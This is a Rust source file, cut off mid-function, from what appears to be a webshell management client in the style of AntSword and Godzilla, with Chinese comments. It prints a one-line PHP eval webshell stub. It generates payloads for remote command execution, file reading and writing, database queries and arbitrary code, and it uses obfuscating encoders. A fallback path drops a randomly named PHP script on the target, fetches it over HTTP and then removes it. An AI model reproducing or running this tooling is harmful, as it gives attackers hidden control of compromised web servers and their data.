//! 标准 PHP WebShell 协议（类蚁剑风格）。
//!
//! 服务端 stub 由用户自行部署到授权目标：
//! ```php
//! <?php @eval(base64_decode($_POST['x']));
//! ```
//! 客户端每次操作生成一段 PHP 代码，base64 后经 POST 参数 `x` 发送；
//! 代码将结果包裹在随机 `nonce` 帧内输出，客户端按 nonce 定位解析。
//! 所有路径 / 命令参数均以 base64 字面量嵌入代码，规避引号与转义问题。
//!
//! 本协议只生成白名单模板，不提供任意 PHP 代码透传入口。

use std::any::Any;
use std::time::Instant;

use base64::Engine;
use base64::engine::general_purpose::STANDARD as B64;
use serde_json::Value;

use dosword_sdk::domain::{
    AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing, FileEntry,
    ProbeResult, ShellProfile,
};

use super::transport::{build_client, form_escape, json_str};
use dosword_sdk::encoder::{EncoderRegistry, PayloadEncoder};
use dosword_sdk::{PluginKind, PluginManifest, ProtocolPlugin};
use dosword_sdk::{Protocol, ProtocolError, SessionState};

pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";

/// 编码器是否启用分阶段载荷模式：`"session": true` 或编码器本身为 xor_session。
fn session_mode_for(protocol_params: &str, encoder: &dyn PayloadEncoder) -> bool {
    if encoder.id() == "xor_session" {
        return true;
    }
    session_enabled(protocol_params) && encoder.id() != "php_stream"
}

/// 分阶段载荷（Godzilla session 模式）是否启用：protocol_params 中 `"session": true`。
fn session_enabled(protocol_params: &str) -> bool {
    serde_json::from_str::<serde_json::Value>(protocol_params)
        .ok()
        .and_then(|value| value.get("session").and_then(|item| item.as_bool()))
        .unwrap_or(false)
}

/// 从 `protocol_params`（JSON）解析编码器 id，缺省 base64（兼容旧配置与旧 stub）。
fn encoder_for(protocol_params: &str) -> &'static dyn PayloadEncoder {
    let encoder_id: Option<String> = serde_json::from_str::<serde_json::Value>(protocol_params)
        .ok()
        .and_then(|value| {
            value
                .get("encoder")
                .and_then(|item| item.as_str().map(str::to_string))
        });
    match encoder_id.as_deref() {
        Some(id) => EncoderRegistry::global()
            .get(id)
            .unwrap_or(&dosword_sdk::encoder::NATIVE_XOR),
        None => &dosword_sdk::encoder::NATIVE_XOR,
    }
}

impl ProtocolPlugin for PhpProtocol {
    fn manifest(&self) -> PluginManifest {
        PluginManifest {
            id: PHP_PROTOCOL_ID.to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: PluginKind::Protocol,
            description: "标准 PHP WebShell（类蚁剑）：命令执行、文件管理、数据库操作。"
                .to_string(),
            capabilities: vec![
                "files".to_string(),
                "terminal".to_string(),
                "database".to_string(),
            ],
        }
    }
}

/// PHP 协议的会话状态：持有专用 HTTP 客户端（每会话独立，避免跨会话并发干扰）。
pub struct PhpSession {
    pub endpoint: String,
    pub password: String,
    pub client: reqwest::blocking::Client,
    /// 载荷编码器（连接时由 protocol_params 决定）。
    pub encoder: &'static dyn PayloadEncoder,
    /// Godzilla 分阶段载荷：处理器代码是否已注入服务端 session。
    pub initialized: std::sync::Mutex<bool>,
    /// 分阶段载荷模式（protocol_params 中 session: true 且编码器支持）。
    pub session_mode: bool,
    /// 会话当前工作目录（cd 支持：每次命令前 stub 端 chdir）。
    pub cwd: std::sync::Mutex<String>,
}

impl PhpSession {
    /// 当前会话工作目录。
    fn current_dir(&self) -> String {
        self.cwd.lock().map(|c| c.clone()).unwrap_or_default()
    }

    /// 更新会话工作目录（命令响应回传）。
    fn update_cwd(&self, cwd: &str) {
        if !cwd.is_empty()
            && let Ok(mut slot) = self.cwd.lock()
        {
            *slot = cwd.to_string();
        }
    }
}

impl SessionState for PhpSession {
    fn as_any(&self) -> &dyn Any {
        self
    }
}

/// PHP 协议实例（无状态单例）。
pub struct PhpProtocol;

/// 服务端代码模板的前缀：静默错误 + 鉴权。
/// 所有操作代码都拼接在它之后，并以 `{NONCE}` 帧收尾。
/// 服务端代码模板的前缀：静默错误 + 鉴权。
/// `{PARAM_K}` 为密码参数名（业务伪装模板为 token，标准模板为 k）。
const TEMPLATE_PREFIX: &str = r#"@ini_set("display_errors","0");@error_reporting(0);@set_time_limit(0);if(@$_POST['{PARAM_K}']!=='{PWD}'){die('AUTH_FAIL');}"#;

/// 每个操作的公共收尾：输出 nonce 帧。
/// 调用方应把业务结果写入 `$__r`（PHP 数组），本段负责序列化输出。
const TEMPLATE_FRAME: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

/// 错误分支的收尾：先输出错误帧再终止，保证客户端能解析到业务错误。
const TEMPLATE_FRAME_DIE: &str =
    r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';die;"#;

/// 数据库驱动白名单（Rust 侧校验，防止任意 DSN 注入）。
const DB_DRIVERS: [&str; 6] = ["mysql", "pgsql", "sqlite", "mssql", "oracle", "redis"];

/// 数据库探测载荷：PDO 连接 + 列出数据库。
/// 占位符：{PWD} {DSN} {USER} {PASS} {LIST_DBS} {DBNAME} {DRIVER}
const DB_PROBE_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['{PARAM_K}']!=='{PWD}'){die('AUTH_FAIL');}
$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
$q=base64_decode('{LIST_DBS}');
if($q===''){$dbs=array(base64_decode('{DBNAME}'));}else{$dbs=array();foreach($dbh->query($q) as $r){$dbs[]=$r[0];}}
$__r=array('ok'=>true,'data'=>array('driver'=>'{DRIVER}','databases'=>$dbs));
}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库连接失败：'.$e->getMessage());}
echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

/// 数据库查询载荷：连接 + 执行 SQL + 结果（查询返回列与行，非查询返回影响行数）。
/// 占位符：{PWD} {DSN} {USER} {PASS} {SQL}
const DB_QUERY_CODE: &str = r#"@ini_set("display_errors","0");@error_reporting(0);if(@$_POST['{PARAM_K}']!=='{PWD}'){die('AUTH_FAIL');}
$dsn=base64_decode('{DSN}');$u=base64_decode('{USER}');$w=base64_decode('{PASS}');
try{$dbh=new PDO($dsn,$u,$w,array(PDO::ATTR_TIMEOUT=>5,PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION));
$sql=base64_decode('{SQL}');
$stmt=$dbh->query($sql);
if($stmt===false){$__r=array('ok'=>false,'error'=>'SQL 执行失败');}
elseif(preg_match('/^\s*(select|show|desc|describe|explain|pragma|with)\b/i',$sql)){
$cols=array();$n=$stmt->columnCount();for($i=0;$i<$n;$i++){$m=$stmt->getColumnMeta($i);$cols[]=(isset($m['name'])&&$m['name']!=='')?$m['name']:('col'.$i);}
$rows=array();$cnt=0;
while(($r=$stmt->fetch(PDO::FETCH_NUM))!==false&&$cnt<1000){$row=array();foreach($r as $v){$row[]=($v===null)?null:(string)$v;}$rows[]=$row;$cnt++;}
$__r=array('ok'=>true,'data'=>array('columns'=>$cols,'rows'=>$rows,'affected'=>0));
}else{$__r=array('ok'=>true,'data'=>array('columns'=>array(),'rows'=>array(),'affected'=>$stmt->rowCount()));}
}catch(Exception $e){$__r=array('ok'=>false,'error'=>'数据库操作失败：'.$e->getMessage());}
echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;

// ---------------------------------------------------------------------------
// 请求调试：统一走 protocol::reqlog（环缓冲，密码脱敏，记录全部协议帧）。
// PHP 协议在此登记为 builtin.php.v1；JSP/ASP/Python/Node 在 jsp.rs 登记。
// ---------------------------------------------------------------------------

impl PhpProtocol {
    // --- Godzilla 分阶段载荷操作（xor_session） ---

    /// P3：probe 内部实现，client 可复用（connect 传入已建 client，避免重复建连接池）。
    fn probe_impl(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
        reused_client: Option<&reqwest::blocking::Client>,
    ) -> Result<ProbeResult, ProtocolError> {
        // 环境信息探测：不产生任何文件系统副作用
        let encoder = encoder_for(&profile.protocol_params);
        if encoder.id().starts_with("native") {
            // NATIVE 与自加密编码器恒走分阶段会话通道
            let client = match reused_client {
                Some(client) => client.clone(),
                None => build_client(settings),
            };
            let php = PhpSession {
                endpoint: profile.endpoint.clone(),
                password: profile.password.clone(),
                client,
                encoder,
                initialized: std::sync::Mutex::new(false),
                session_mode: false,
                cwd: std::sync::Mutex::new(String::new()),
            };
            return self.session_probe(&php, settings);
        }
        if session_mode_for(&profile.protocol_params, encoder) {
            let client = match reused_client {
                Some(client) => client.clone(),
                None => build_client(settings),
            };
            let php = PhpSession {
                endpoint: profile.endpoint.clone(),
                password: profile.password.clone(),
                client,
                encoder,
                initialized: std::sync::Mutex::new(false),
                session_mode: true,
                cwd: std::sync::Mutex::new(String::new()),
            };
            return self.session_probe(&php, settings);
        }
        let code = format!(
            "{}\n$__r=array('ok'=>true,'data'=>array('server'=>php_uname('s').' '.php_uname('r').' '.php_uname('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>getcwd(),'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>php_uname('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>(string)ini_get('disable_functions')));{}",
            Self::build_prefix(encoder, &profile.password),
            TEMPLATE_FRAME
        );
        let client = match reused_client {
            Some(client) => client.clone(),
            None => build_client(settings),
        };
        let value = self.send_frame(
            &client,
            &profile.endpoint,
            &profile.password,
            &code,
            settings,
            "probe",
            encoder,
        )?;

        let server = value
            .pointer("/data/server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let web_server = value
            .pointer("/data/web_server")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let runtime = value
            .pointer("/data/php_version")
            .and_then(|v| v.as_str())
            .unwrap_or("未知")
            .to_string();
        let current_dir = value
            .pointer("/data/current_dir")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let separator = value
            .pointer("/data/separator")
            .and_then(|v| v.as_str())
            .unwrap_or("/")
            .to_string();
        let php_sapi = value
            .pointer("/data/php_sapi")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let arch = value
            .pointer("/data/arch")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let extensions = value
            .pointer("/data/extensions")
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str().map(String::from))
                    .collect()
            })
            .unwrap_or_default();
        let disable_functions = value
            .pointer("/data/disable_functions")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();

        Ok(ProbeResult {
            status: "online".to_string(),
            server,
            web_server,
            runtime,
            current_dir,
            separator,
            message: "PHP 协议探测成功，返回真实环境信息。".to_string(),
            php_sapi,
            arch,
            extensions,
            disable_functions,
            info: info_map(&value),
        })
    }

    fn session_probe(
        &self,
        php: &PhpSession,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        let value = dispatch(php, "probe", &[], settings)?;
        let get = |key: &str| -> String {
            value
                .pointer(&format!("/data/{key}"))
                .and_then(|v| v.as_str())
                .unwrap_or("未知")
                .to_string()
        };
        Ok(ProbeResult {
            status: "online".to_string(),
            server: get("server"),
            web_server: get("web_server"),
            runtime: get("php_version"),
            current_dir: get("current_dir"),
            separator: get("separator"),
            message: "分阶段载荷探测成功。".to_string(),
            php_sapi: get("php_sapi"),
            arch: get("arch"),
            extensions: value
                .pointer("/data/extensions")
                .and_then(|v| v.as_array())
                .map(|a| {
                    a.iter()
                        .filter_map(|v| v.as_str().map(String::from))
                        .collect()
                })
                .unwrap_or_default(),
            disable_functions: get("disable_functions"),
            info: info_map(&value),
        })
    }

    fn session_exec(
        &self,
        php: &PhpSession,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let start = Instant::now();
        let w = php.current_dir();
        let value = dispatch(php, "exec", &[("c", command), ("w", &w)], settings)?;
        let duration_ms = start.elapsed().as_millis() as u64;
        let raw = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok());
        let stdout = raw
            .as_deref()
            .and_then(|bytes| String::from_utf8(bytes.to_vec()).ok())
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .map(str::to_string);
        if let Some(ref c) = cwd {
            php.update_cwd(c);
        }
        Ok(CommandOutput {
            stdout,
            duration_ms,
            cwd,
            raw_b64: raw.map(|bytes| B64.encode(bytes)),
        })
    }

    fn session_list_dir(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let value = dispatch(php, "list", &[("p", path)], settings)?;
        let entries = value
            .pointer("/data/entries")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|item| FileEntry {
                        name: item
                            .get("name")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                        path: item
                            .get("path")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                        is_dir: item
                            .get("is_dir")
                            .and_then(|v| v.as_bool())
                            .unwrap_or(false),
                        size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                        modified: item
                            .get("mtime")
                            .and_then(|v| v.as_i64())
                            .map(format_timestamp)
                            .unwrap_or_default(),
                        perms: item
                            .get("perms")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                    })
                    .collect()
            })
            .unwrap_or_default();
        Ok(DirListing { entries })
    }

    fn session_read_file(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let value = dispatch(php, "read", &[("p", path)], settings)?;
        value
            .get("data")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok())
            .ok_or_else(|| ProtocolError::ParseError("响应缺少文件内容".to_string()))
    }

    fn session_write_file(
        &self,
        php: &PhpSession,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(
            php,
            "write",
            &[("p", path), ("d", &B64.encode(content))],
            settings,
        )?;
        Ok(())
    }

    fn session_delete(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(php, "delete", &[("p", path)], settings)?;
        Ok(())
    }

    fn session_rename(
        &self,
        php: &PhpSession,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(php, "rename", &[("f", from), ("t", to)], settings)?;
        Ok(())
    }

    fn session_mkdir(
        &self,
        php: &PhpSession,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(php, "mkdir", &[("p", path)], settings)?;
        Ok(())
    }

    fn session_touch(
        &self,
        php: &PhpSession,
        path: &str,
        timestamp: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        dispatch(
            php,
            "touch",
            &[("p", path), ("t", &timestamp.to_string())],
            settings,
        )?;
        Ok(())
    }

    fn session_db_probe(
        &self,
        php: &PhpSession,
        connection: &DbConnection,
        settings: &AppSettings,
    ) -> Result<DbProbeResult, ProtocolError> {
        let value = dispatch(php, "dbprobe", &[("c", &conn_json(connection))], settings)?;
        let databases = value
            .pointer("/data/databases")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        Ok(DbProbeResult {
            driver: connection.driver.clone(),
            databases,
            message: "数据库连接成功".to_string(),
        })
    }

    fn session_db_query(
        &self,
        php: &PhpSession,
        connection: &DbConnection,
        sql: &str,
        settings: &AppSettings,
    ) -> Result<DbQueryResult, ProtocolError> {
        let value = dispatch(
            php,
            "dbquery",
            &[("c", &conn_json(connection)), ("q", sql)],
            settings,
        )?;
        let columns = value
            .pointer("/data/columns")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .filter_map(|item| item.as_str().map(str::to_string))
                    .collect()
            })
            .unwrap_or_default();
        let rows = value
            .pointer("/data/rows")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|row| {
                        row.as_array()
                            .map(|cells| {
                                cells
                                    .iter()
                                    .map(|cell| {
                                        if cell.is_null() {
                                            None
                                        } else {
                                            Some(cell.as_str().unwrap_or("").to_string())
                                        }
                                    })
                                    .collect()
                            })
                            .unwrap_or_default()
                    })
                    .collect()
            })
            .unwrap_or_default();
        let affected = value
            .pointer("/data/affected")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);
        Ok(DbQueryResult {
            columns,
            rows,
            affected,
            duration_ms: 0,
        })
    }

    /// 将 `params` 逐项替换进模板的 `{key}` 占位符。
    fn build_code(template: &str, params: &[(&str, &str)]) -> String {
        let mut code = template.to_string();
        for (key, value) in params {
            code = code.replace(&format!("{{{key}}}"), value);
        }
        code
    }

    /// 构建鉴权前缀（密码参数名随编码器业务伪装模板变化：token / k）。
    /// body 模式（php_stream）载荷不经表单传输，stub 无鉴权，前缀不包含密码比较。
    fn build_prefix(encoder: &dyn PayloadEncoder, password: &str) -> String {
        if encoder.body_mode() {
            return "@ini_set(\"display_errors\",\"0\");@error_reporting(0);@set_time_limit(0);"
                .to_string();
        }
        let (key_param, _) = encoder.form_params();
        Self::build_code(
            TEMPLATE_PREFIX,
            &[
                ("PARAM_K", key_param),
                (
                    "PWD",
                    &crate::protocol::transport::php_single_quote(password),
                ),
            ],
        )
    }

    /// 发送一次协议请求并解析 nonce 帧，返回业务 JSON 值。
    ///
    /// 帧协议：调用方生成的 `code` 中必须包含 `echo '{nonce}';`（nonce 由本方法
    /// 随机生成并替换 `{NONCE}` 占位符），服务器会原样回显该 nonce，响应中
    /// 两个 nonce 之间的部分即协议帧。
    #[allow(clippy::too_many_arguments)] // 帧协议字段固定，拆结构体反而增加调用方噪声
    fn send_frame(
        &self,
        client: &reqwest::blocking::Client,
        endpoint: &str,
        password: &str,
        code_template: &str,
        settings: &AppSettings,
        action: &str,
        encoder: &dyn PayloadEncoder,
    ) -> Result<Value, ProtocolError> {
        // 8 字节随机 nonce（hex 字符串）
        let nonce = random_nonce();
        let start = Instant::now();
        let code = code_template.replace("{NONCE}", &nonce);

        // 按编码器编码载荷（与服务端 stub 的解码逻辑对应）
        // body 模式（如 php_stream）：载荷直传请求体，stub 用 include 流执行；
        // 表单模式：POST k（密码）+ x（编码后载荷）。
        let body = if encoder.body_mode() {
            encoder.encode(&code, password)
        } else {
            let (key_param, data_param) = encoder.form_params();
            let payload = encoder.encode(&code, password);
            format!(
                "{key_param}={}&{data_param}={}",
                form_escape(password),
                form_escape(&payload)
            )
        };

        let response = client
            .post(endpoint)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(body)
            .send()
            .map_err(|error| ProtocolError::Network(error.to_string()))?;

        let status = response.status();
        let duration_ms = start.elapsed().as_millis() as u64;

        if !status.is_success() {
            return Err(ProtocolError::HttpStatus(
                status.as_u16(),
                status.canonical_reason().unwrap_or("").to_string(),
            ));
        }

        let max_bytes = settings.max_file_size_mb.saturating_mul(1024 * 1024);
        let bytes = crate::protocol::transport::read_limited(response, max_bytes)
            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
        if bytes.len() > max_bytes as usize {
            return Err(ProtocolError::ParseError(format!(
                "响应超过大小上限（{}MB）",
                settings.max_file_size_mb
            )));
        }
        let text = String::from_utf8_lossy(&bytes);

        // 调试记录（先于错误分支，失败请求同样留痕）——统一 reqlog 模块
        crate::protocol::reqlog::record_request(
            PHP_PROTOCOL_ID,
            action,
            endpoint,
            status.as_u16(),
            duration_ms,
            &code,
            &text,
            password,
        );

        // 鉴权失败时服务器直接输出明文 AUTH_FAIL（无帧）
        if text.contains("AUTH_FAIL") {
            return Err(ProtocolError::AuthFailed(
                "密码错误，服务器拒绝鉴权".to_string(),
            ));
        }

        // 按 nonce 帧定位响应体（帧外杂散输出天然免疫）
        let start = text.find(&nonce).ok_or_else(|| {
            ProtocolError::ParseError(
                "响应中未找到协议帧（请确认目标运行的是标准 PHP 协议 stub）".to_string(),
            )
        })?;
        let tail = &text[start + nonce.len()..];
        let end = tail.find(&nonce).ok_or(ProtocolError::ParseError(
            "协议帧不完整（响应被截断）".to_string(),
        ))?;
        let payload = &tail[..end];

        let decoded = B64
            .decode(payload)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 Base64".to_string()))?;
        let value: Value = serde_json::from_slice(&decoded)
            .map_err(|_| ProtocolError::ParseError("帧内容不是合法 JSON".to_string()))?;

        if value.get("ok").and_then(|v| v.as_bool()) != Some(true) {
            let error = value
                .get("error")
                .and_then(|v| v.as_str())
                .unwrap_or("未知错误")
                .to_string();
            return Err(ProtocolError::ServerError(error));
        }

        Ok(value)
    }
}

/// 8 字节真随机 nonce（hex 字符串），用于帧定位与防注入。
fn random_nonce() -> String {
    let mut bytes = [0u8; 8];
    // 随机源失败时退化为时间戳低位，仍能保证帧唯一性（仅防注入强度降低）
    if getrandom::fill(&mut bytes).is_err() {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|duration| duration.subsec_nanos())
            .unwrap_or(0);
        bytes = (nanos as u64).to_le_bytes();
    }
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

/// 将 unix 时间戳格式化为本地时间的 `YYYY-MM-DD HH:MM`。
fn format_timestamp(ts: i64) -> String {
    use chrono::{DateTime, Local};
    DateTime::from_timestamp(ts, 0)
        .map(|datetime| {
            datetime
                .with_timezone(&Local)
                .format("%Y-%m-%d %H:%M")
                .to_string()
        })
        .unwrap_or_default()
}

impl Protocol for PhpProtocol {
    fn id(&self) -> &'static str {
        PHP_PROTOCOL_ID
    }

    fn display_name(&self) -> &'static str {
        "标准 PHP WebShell（类蚁剑）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn run_code(
        &self,
        session: &dyn SessionState,
        language: &str,
        code: &str,
        settings: &AppSettings,
    ) -> Result<String, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if language != "php" {
            return Err(ProtocolError::NotSupported(format!(
                "PHP 协议暂不支持 {language} 代码执行"
            )));
        }
        // S1：任意代码执行安全闸 + 载荷长度上限（64KB）
        if !settings.allow_arbitrary_code {
            return Err(ProtocolError::NotSupported(
                "run_code 任意代码执行已禁用（设置 allow_arbitrary_code=false）".into(),
            ));
        }
        if code.len() > 64 * 1024 {
            return Err(ProtocolError::NotSupported(format!(
                "run_code 载荷超过长度上限（{} / 65536 字节）",
                code.len()
            )));
        }
        // 1) S2：优先 eval 通道（单次往返、无临时文件落地）
        //    载荷剥离 <?php 后直接经 dispatch eval 执行（eval_fn try/catch 包裹）。
        //    失败（代码致命错误/目标不支持 eval）时降级临时文件通道。
        let script = code
            .trim_start()
            .strip_prefix("<?php")
            .map(str::trim_start)
            .unwrap_or(code);
        match dispatch(php, "eval", &[("c", script)], settings) {
            Ok(value) => {
                let text = value
                    .pointer("/data")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();
                return Ok(text);
            }
            Err(_) => {
                // 降级：临时文件通道（目标 eval 不可用或载荷依赖独立请求环境）
            }
        }
        // 2) 降级通道：获取目标当前目录 + 随机文件名 + 写入载荷
        let cwd = self
            .execute_command(session, "pwd 2>/dev/null", settings)?
            .stdout
            .trim()
            .to_string();
        if cwd.is_empty() {
            return Err(ProtocolError::ServerError(
                "run_code 降级通道失败：无法获取目标当前目录（命令通道不可用且 eval 失败）"
                    .to_string(),
            ));
        }
        // 注意：点开头文件在部分 PHP 内置服务器下行为异常（反弹 shell 无输出），
        // 使用下划线前缀（仍为随机难猜，且兼容隐藏意图）
        let name = format!("_dsw_{:x}.php", uuid::Uuid::new_v4().simple());
        let path = format!("{cwd}/{name}");
        self.write_file(session, &path, code.as_bytes(), settings)?;
        // 3) HTTP 请求执行（同目录 URL）
        let mut url = url::Url::parse(&php.endpoint)
            .map_err(|error| ProtocolError::ParseError(format!("Endpoint 解析失败：{error}")))?;
        let new_path = url
            .path()
            .rsplit_once('/')
            .map(|(dir, _)| format!("{dir}/{name}"))
            .unwrap_or_else(|| format!("/{name}"));
        url.set_path(&new_path);
        let response = php
            .client
            .get(url)
            .timeout(std::time::Duration::from_secs(
                settings.default_timeout_secs.max(10),
            ))
            .send()
            .map_err(|error| ProtocolError::Network(error.to_string()))?;
        if !response.status().is_success() {
            let _ = self.delete_path(session, &path, settings);
            return Err(ProtocolError::HttpStatus(
                response.status().as_u16(),
                "载荷执行失败：目标无法访问临时脚本（当前目录与文档根不一致或不可写）".to_string(),
            ));
        }
        let text = response
            .text()
            .map_err(|error| ProtocolError::ParseError(error.to_string()))?;
        // 4) 清理临时载荷
        let _ = self.delete_path(session, &path, settings);
        Ok(text)
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        self.probe_impl(profile, settings, None)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        // 先探测验证密码与连通性，再建立会话（探测与会话复用同一连接池）
        let client = build_client(settings);
        let result = self.probe_impl(profile, settings, Some(&client))?;
        let encoder = encoder_for(&profile.protocol_params);
        let session: Box<dyn SessionState> = Box::new(PhpSession {
            endpoint: profile.endpoint.clone(),
            password: profile.password.clone(),
            client,
            encoder,
            initialized: std::sync::Mutex::new(false),
            session_mode: session_mode_for(&profile.protocol_params, encoder),
            cwd: std::sync::Mutex::new(result.current_dir.clone()),
        });
        Ok((session, result))
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_exec(php, command, settings);
        }
        let cmd_b64 = B64.encode(command.as_bytes());
        let code = format!(
            "{}\n$c=base64_decode('{cmd_b64}');$o=@shell_exec($c.' 2>&1');$__r=array('ok'=>true,'data'=>array('stdout'=>base64_encode((string)$o),'cwd'=>getcwd()));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME
        );
        let start = Instant::now();
        let value = self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "exec",
            php.encoder,
        )?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let raw = value
            .pointer("/data/stdout")
            .and_then(|v| v.as_str())
            .and_then(|s| B64.decode(s).ok());
        let stdout = raw
            .as_deref()
            .and_then(|bytes| String::from_utf8(bytes.to_vec()).ok())
            .unwrap_or_default();
        let cwd = value
            .pointer("/data/cwd")
            .and_then(|v| v.as_str())
            .map(str::to_string);

        Ok(CommandOutput {
            stdout,
            duration_ms,
            cwd,
            raw_b64: raw.map(|bytes| B64.encode(bytes)),
        })
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
            return self.session_list_dir(php, path, settings);
        }
        let path_b64 = B64.encode(path.as_bytes());
        let code = format!(
            "{}\n$p=base64_decode('{path_b64}');$d=@scandir($p);if($d===false){{$__r=array('ok'=>false,'error'=>'无法读取目录');{} }}$out=array();foreach($d as $f){{if($f==='.'||$f==='..')continue;$full=$p.DIRECTORY_SEPARATOR.$f;$s=@stat($full);$is_dir=is_dir($full);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$is_dir,'size'=>($is_dir||$s===false)?0:$s['size'],'mtime'=>($s===false)?0:$s['mtime'],'perms'=>($s===false)?'':substr(sprintf('%o',$s['mode']&0777),-3));}}$__r=array('ok'=>true,'data'=>array('entries'=>$out));{}",
            Self::build_prefix(php.encoder, &php.password),
            TEMPLATE_FRAME_DIE,
            TEMPLATE_FRAME
        );
        let value = self.send_frame(
            &php.client,
            &php.endpoint,
            &php.password,
            &code,
            settings,
            "list_dir",
            php.encoder,
        )?;

        let entries: Vec<FileEntry> = value
            .pointer("/data/entries")
            .and_then(|v| v.as_array())
            .map(|array| {
                array
                    .iter()
                    .map(|item| FileEntry {
                        name: item
                            .get("name")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                        path: item
                            .get("path")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                        is_dir: item
                            .get("is_dir")
                            .and_then(|v| v.as_bool())
                            .unwrap_or(false),
                        size: item.get("size").and_then(|v| v.as_u64()).unwrap_or(0),
                        modified: item
                            .get("mtime")
                            .and_then(|v| v.as_i64())
                            .map(format_timestamp)
                            .unwrap_or_default(),
                        perms: item
                            .get("perms")
                            .and_then(|v| v.as_str())
                            .unwrap_or("")
                            .to_string(),
                    })
                    .collect()
            })
            .unwrap_or_default();

        Ok(DirListing { entries })
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        let php = session
            .as_any()
            .downcast_ref::<PhpSession>()
            .ok_or_else(|| ProtocolError::SessionInvalid("会话类型不匹配".into()))?;
        if is_session(php) {
